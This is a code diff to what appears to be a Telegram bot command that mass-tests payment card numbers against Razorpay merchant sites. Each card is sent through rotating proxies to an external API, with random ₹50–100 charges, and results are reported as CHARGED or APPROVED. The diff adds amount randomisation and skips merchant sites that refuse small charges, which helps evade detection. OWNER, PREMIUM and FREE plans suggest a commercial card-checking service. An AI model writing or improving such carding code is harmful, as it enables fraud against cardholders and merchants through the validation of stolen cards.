@@ -30,6 +30,7 @@ REGION = "IN"
 _sites = []
 _proxies = []
 _amount_paise = 100  # ₹1 default, overridden per command
+_amount_override = None  # amount=X override; else random 50-100 per request
 _site_ctr = itertools.count()
 _proxy_ctr = itertools.count()
 
@@ -103,13 +104,22 @@ def extract_cards(text):
     return cards
 
 
+_bad_sites = set()  # sites that returned "Amount too small" (min > ₹100)
+
+
 def _next_site():
     global _sites
     if not _sites:
         _sites = load_sites()
     if not _sites:
         return None
-    return _sites[next(_site_ctr) % len(_sites)]
+    n = len(_sites)
+    for _ in range(n):
+        site = _sites[next(_site_ctr) % n]
+        if _site_key(site) in _bad_sites:
+            continue
+        return site
+    return None
 
 
 _proxy_locks = {}
@@ -157,11 +167,12 @@ def check_fn(card):
     if proxy is None:
         return "ERROR", "No proxies loaded", "UNKNOWN"
     try:
+        amount = _amount_override or random.randint(5000, 10000)
         q = urllib.parse.urlencode({
             "cc": card,
             "site": site,
             "proxy": proxy,
-            "amount": _amount_paise,
+            "amount": amount,
             "region": REGION,
         })
         url = f"{RZ_API}/razorpay?{q}"
@@ -172,6 +183,8 @@ def check_fn(card):
             return "ERROR", f"API: {str(e)[:80]}", "UNKNOWN"
         status = str(data.get("status") or "error").lower()
         msg = data.get("message") or data.get("reason") or "N/A"
+        if "amount too small" in (msg or "").lower():
+            _bad_sites.add(_site_key(site))
         if status == "charged":
             return "CHARGED", msg, "CHARGED"
         if status == "approved":
@@ -226,12 +239,15 @@ async def mrz_command(message: types.Message):
             return
 
     # amount override: amount=X (rupees) — else random ₹50–₹100
+    global _amount_override
     amt_match = re.search(r'amount\s*=\s*(\d+)', raw_text, re.I)
     if amt_match:
-        _amount_paise = int(amt_match.group(1)) * 100
+        _amount_override = int(amt_match.group(1)) * 100
+        _amount_paise = _amount_override
         raw_text = raw_text[:amt_match.start()] + " " + raw_text[amt_match.end():]
     else:
-        _amount_paise = random.randint(5000, 10000)
+        _amount_override = None
+        _amount_paise = None
 
     if not raw_text.strip():
         await safe_reply(message,
@@ -281,7 +297,7 @@ async def mrz_command(message: types.Message):
 
     plan_name = "OWNER" if is_owner_user(user_id) else ("PREMIUM" if is_premium else "FREE")
 
-    await show_selection(message, valid, check_fn, f"𝐑𝐚𝐳𝐨𝐫𝐩𝐚𝐲 𝐌𝐚𝐬𝐬 (₹{_amount_paise // 100})", user_id, user, "mrz", plan_name)
+    await show_selection(message, valid, check_fn, f"𝐑𝐚𝐳𝐨𝐫𝐩𝐚𝐲 𝐌𝐚𝐬𝐬 (₹{_amount_override // 100})" if _amount_override else "𝐑𝐚𝐳𝐨𝐫𝐩𝐚𝐲 𝐌𝐚𝐬𝐬 (₹50-100)", user_id, user, "mrz", plan_name)
 
 
 @router.callback_query(F.data.startswith("mrz_res_"))
